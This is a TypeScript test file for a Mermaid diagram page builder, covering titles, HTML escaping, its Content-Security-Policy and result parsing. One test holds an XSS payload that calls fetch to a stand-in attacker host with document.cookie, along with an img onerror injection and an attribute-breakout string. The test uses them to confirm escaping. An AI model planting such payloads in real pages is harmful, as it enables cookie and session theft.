import { expect, test } from "nsh/test";
import { diagramPage, diagramTitle, parseDiagramResult } from "#lib/mermaid";

const colors = { background: "#fff", text: "#111", line: "#555", fill: "#eee", border: "#ccc" };
const page = (code: string, title = "Diagram: flowchart") => diagramPage({ origin: "http://127.0.0.1:4010", code, title, dark: false, colors });

test("a diagram is named by its title, else by the kind it declares", () => {
  expect(diagramTitle("flowchart LR\n  A --> B")).toBe("Diagram: flowchart");
  expect(diagramTitle("graph TD\n  A --> B")).toBe("Diagram: flowchart");
  expect(diagramTitle("sequenceDiagram\n  A->>B: hi")).toBe("Diagram: sequence diagram");
  expect(diagramTitle("%% a comment first\nstateDiagram-v2\n  [*] --> A")).toBe("Diagram: state diagram");
  expect(diagramTitle('---\ntitle: "Payment flow"\n---\nflowchart LR\n  A --> B')).toBe("Diagram: Payment flow");
  expect(diagramTitle("pie\n  title Pets\n  \"Dogs\": 3")).toBe("Diagram: Pets");
  expect(diagramTitle("somethingNew\n  x")).toBe("Diagram: diagram");
  expect(diagramTitle("")).toBe("Diagram: diagram");
});

test("what a diagram says in its source can never become script of the page", () => {
  const hostile = '</pre><script>fetch("https://evil.example/?"+document.cookie)</script><img src=x onerror=alert(1)>';
  const html = page(`flowchart LR\n  A["${hostile}"] --> B`);
  // The source is only ever text inside a hidden element: no tag of it survives as a tag.
  expect(html).not.toContain("<script>fetch");
  expect(html).not.toContain("<img src=x");
  expect(html).toContain("&lt;script&gt;fetch");
  // exactly the two scripts the page itself has: the bundled one and its own
  expect(html.match(/<script/g)?.length).toBe(2);
  // a title cannot break out of its attribute either
  expect(page("flowchart LR\n A-->B", 'x" onload="alert(1)').includes('aria-label="x&quot; onload=')).toBe(true);
});

test("the page can load its one script and nothing else from anywhere", () => {
  const html = page("flowchart LR\n  A --> B");
  const policy = /Content-Security-Policy" content="([^"]*)"/.exec(html)?.[1] ?? "";
  expect(policy).toContain("default-src 'none'");
  expect(policy).toContain("script-src http://127.0.0.1:4010 'unsafe-inline'");
  for (const reach of ["connect-src", "frame-src", "img-src http", "form-action", "*"]) expect(policy).not.toContain(reach);
  expect(html).toContain('securityLevel: "strict"');
  expect(html).toContain('<script src="http://127.0.0.1:4010/mermaid.min.js">');
});

test("the page's answer is read only when it is one", () => {
  expect(parseDiagramResult('{"ok":true,"w":320,"h":180}')).toEqual({ ok: true, w: 320, h: 180 });
  expect(parseDiagramResult('{"ok":false,"message":"Parse error on line 2"}')).toEqual({ ok: false, message: "Parse error on line 2" });
  for (const junk of ["", "not json", '{"ok":true}', '{"ok":"yes","w":1,"h":1}', "[]", "null"]) expect(parseDiagramResult(junk)).toBeNull();
});
